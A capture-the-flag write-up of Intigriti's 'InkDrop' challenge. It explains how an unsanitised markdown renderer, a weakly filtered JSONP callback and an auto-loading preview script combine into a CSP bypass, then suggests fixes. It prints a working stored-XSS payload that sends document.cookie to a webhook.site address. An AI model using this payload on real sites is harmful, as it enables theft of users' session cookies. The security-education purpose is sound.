# InkDrop - Intigriti

<figure><img src="./images/articles/ctf-inkdrop-intigriti/01.png" alt=""><figcaption></figcaption></figure>

## Breaking InkDrop: A JSONP Callback Injection Adventure

### Introduction

So there I was, staring at this CTF challenge called "InkDrop" - a collaborative writing platform where users can create and share markdown posts. The goal? Find an XSS vulnerability and steal the admin's flag cookie. Sounds simple enough, right? Well, this one turned out to be a pretty neat chain of vulnerabilities that I want to walk you through.

### Initial Reconnaissance

First things first, I downloaded the source code and started poking around. The app is a Flask-based blogging platform with some interesting features:

* Users can register, login, and create posts
* Posts support markdown rendering
* There's a "Report to Moderator" button that triggers a bot to visit your post
* The bot logs in as admin and has a flag in its cookies

The setup screamed "steal the admin's cookies via XSS," but the question was: where's the vulnerability?

### Finding the Weak Spots

#### Discovery #1: The Markdown Renderer

Looking at `app.py`, I found this markdown rendering function:

```python
def render_markdown(content):
    html_content = content
    html_content = re.sub(r'^### (.+)$', r'<h3>\1</h3>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^## (.+)$', r'<h2>\1</h2>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^# (.+)$', r'<h1>\1</h1>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_content)
    html_content = re.sub(r'\*(.+?)\*', r'<em>\1</em>', html_content)
    html_content = re.sub(r'\[(.+?)\]\((.+?)\)', r'<a href="\2">\1</a>', html_content)
    html_content = html_content.replace('\n\n', '</p><p>')
    html_content = f'<p>{html_content}</p>'
    return html_content
```

Hmm, interesting. It's a homemade markdown parser using regex. No HTML sanitization whatsoever. This means I could potentially inject raw HTML into posts. Let me try something...

I created a test post with:

```javascript
<script>alert('XSS')</script>
```

<figure><img src="./images/articles/ctf-inkdrop-intigriti/02.png" alt=""><figcaption></figcaption></figure>

#### Discovery #2: The Content Security Policy

Checking `post_view.html`, I found this CSP header:

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src *;">
```

Ah, there's the catch! Inline scripts are blocked. Only scripts from the same origin (`'self'`) are allowed. So even though I can inject HTML, I can't execute inline JavaScript. I needed to find a same-origin script source that I could control

#### Discovery #3: The Suspicious JSONP Endpoint&#x20;

<figure><img src="./images/articles/ctf-inkdrop-intigriti/03.png" alt=""><figcaption></figcaption></figure>

Browsing through the API endpoints, I stumbled upon something interesting in `app.py`:

```python
@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    if '<' in callback or '>' in callback:
        callback = 'handleData'
    
    user_data = {
        'authenticated': 'user_id' in session,
        'timestamp': time.time()
    }
    
    if 'user_id' in session:
        user = User.query.get(session['user_id'])
        if user:
            user_data['username'] = user.username
    
    response = f"{callback}({json.dumps(user_data)})"
    return Response(response, mimetype='application/javascript')

```

Wait a minute. This is a JSONP endpoint that takes a `callback` parameter and wraps JSON data with it. The only validation is checking for `<` and `>` characters.

Let's See What Happen When i visit :

<pre><code><strong>/api/jsonp?callback=alert
</strong></code></pre>

<figure><img src="./images/articles/ctf-inkdrop-intigriti/04.png" alt=""><figcaption></figcaption></figure>

Holy crap! This is JSONP callback injection! I can control what JavaScript function gets called. The filter only blocks angle brackets, but I can use any valid JavaScript expression.

#### Discovery #4: The Script Loader

Now I needed a way to load this malicious JSONP endpoint as a script. Looking at `preview.js`, I found this gem:

```javascript
function processContent(container) {
    const codeBlocks = container.querySelectorAll('pre code');
    codeBlocks.forEach(function(block) {
        block.classList.add('highlighted');
    });
    
    const scripts = container.querySelectorAll('script');
    scripts.forEach(function(script) {
        if (script.src && script.src.includes('/api/')) {
            const newScript = document.createElement('script');
            newScript.src = script.src;
            document.body.appendChild(newScript);
        }
    });
}
```

Oh wow. The `processContent` function looks for any `<script>` tags with a `src` attribute containing `/api/`, and it **dynamically creates and executes them**!

This is perfect because:

1. I can inject `<script src="/api/jsonp?callback=...">` via the markdown renderer
2. The preview\.js will find it and execute it
3. The CSP allows it because it's loading from the same origin
4. I control the callback parameter, which controls what JavaScript executes

<figure><img src="./images/articles/ctf-inkdrop-intigriti/05.png" alt=""><figcaption></figcaption></figure>

### Piecing Together the Attack

Now I had all the pieces. Let me trace through the attack flow:

1. **Create a malicious post** with a script tag that loads the JSONP endpoint
2. **Report the post** to trigger the admin bot
3. **The bot visits the post** while logged in as admin (with the flag cookie)
4. **preview\.js loads** and fetches the rendered content
5. **processContent() finds my script tag** and executes it
6. **My JSONP callback runs** with the admin's cookies accessible
7. **Exfiltrate the flag!**

***

### Crafting the Exploit

The final payload was actually quite elegant:

```javascript
<script src="/api/jsonp?callback=fetch('https://webhook.site/YOUR-ID/?hacker='.concat(document.cookie))//"></script>
```

Let me break down what happens:

1. The markdown renderer doesn't sanitize this, so it stays as-is in the HTML
2. preview\.js finds this script tag (it has `/api/` in the src)
3. The browser loads `/api/jsonp?callback=fetch('https://webhook.site/YOUR-ID/?hacker='.concat(document.cookie))//`
4. The JSONP endpoint returns:

```
fetch('https://webhook.site/YOUR-ID/?hacker='.concat(document.cookie))//({"authenticated": true, ...})
```

* The `//` at the end comments out the JSON data, preventing syntax errors
* `fetch()` executes, sending the cookies (including the flag!) to my webhook

### The Exploit in Action

Here's what I did step by step:

**Step 1:** Registered an account on the challenge platform

**Step 2:** Created a new post with this content:

````javascript
# Hack It!!!!!
## By everythingBlackkk

<script src="/api/jsonp?callback=fetch('https://webhook.site/6ed04c6d-dd47-42fa-8ff9-87671780d23d/?hacker='.concat(document.cookie))//"></script>
```
````

<figure><img src="./images/articles/ctf-inkdrop-intigriti/06.png" alt=""><figcaption></figcaption></figure>

The flag was mine!

<figure><img src="./images/articles/ctf-inkdrop-intigriti/07.png" alt=""><figcaption></figcaption></figure>

***

### Why This Attack Works

Let me summarize the vulnerability chain:

#### Vulnerability #1: Unsanitized HTML in Markdown Renderer

* The `render_markdown()` function doesn't strip HTML tags
* Allows injection of `<script>` tags into post content

#### Vulnerability #2: Weak JSONP Callback Validation

* The `/api/jsonp` endpoint only filters `<` and `>`
* Any other JavaScript expression can be used as the callback
* Returns JavaScript code with user-controlled function name

#### Vulnerability #3: Automatic Script Execution

* `preview.js` automatically finds and executes scripts with `/api/` in src
* No validation on what these scripts actually do
* Provides the bridge between injected HTML and code execution

#### Vulnerability #4: Non-HttpOnly Flag Cookie

* The bot sets the flag as a regular cookie (not httpOnly)
* JavaScript can read it via `document.cookie`
* Makes exfiltration trivial

#### The CSP Bypass

* CSP allows `script-src 'self'`
* JSONP endpoint is same-origin, so it's allowed
* Dynamic script creation in preview\.js is allowed
* Result: Complete CSP bypass

***

### The Fix :)&#x20;

How should InkDrop fix these issues?

**Fix #1: Sanitize HTML Output**

```python
import bleach

def render_markdown(content):
    # ... existing markdown conversion ...
    
    # Whitelist only safe HTML tags
    allowed_tags = ['p', 'h1', 'h2', 'h3', 'strong', 'em', 'a']
    allowed_attrs = {'a': ['href']}
    html_content = bleach.clean(html_content, tags=allowed_tags, attributes=allowed_attrs)
    return html_content
```

And Make the Flag Cookie HttpOnly

***

## Resources From Me :)

* What is JSOP : <https://www.bigbinary.com/blog/what-is-jsonp>
* What is Stored XSS : <https://portswigger.net/web-security/cross-site-scripting/stored>
* cookie attributes : <https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies>
*

Thanks **Intigriti** for this awesome challenge ❤️
